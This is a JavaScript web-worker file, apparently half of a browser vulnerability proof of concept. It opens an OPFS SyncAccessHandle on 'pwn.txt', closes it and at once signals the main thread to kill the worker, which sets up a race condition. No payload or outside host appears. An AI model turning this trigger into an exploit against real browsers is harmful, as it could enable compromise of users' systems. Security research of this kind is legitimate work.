// worker.js

function log(msg) {
    postMessage({ type: 'log', msg: "[Worker] " + msg });
}

async function triggerRace() {
    try {
        log("Requesting OPFS directory...");
        const root = await navigator.storage.getDirectory();

        log("Creating target file (pwn.txt)...");
        const fileHandle = await root.getFileHandle('pwn.txt', { create: true });

        log("Opening SyncAccessHandle...");
        const accessHandle = await fileHandle.createSyncAccessHandle();

        log("Handle opened. Firing close() and signaling race...");

        // TASK A: Start the asynchronous close operation.
        accessHandle.close();

        // TASK B: Signal the main thread to terminate this worker IMMEDIATELY.
        postMessage({ type: 'RACE_NOW' });

    } catch (e) {
        // Send exact error back to main thread
        postMessage({ type: 'error', msg: e.name + ": " + e.message });
    }
}

triggerRace();
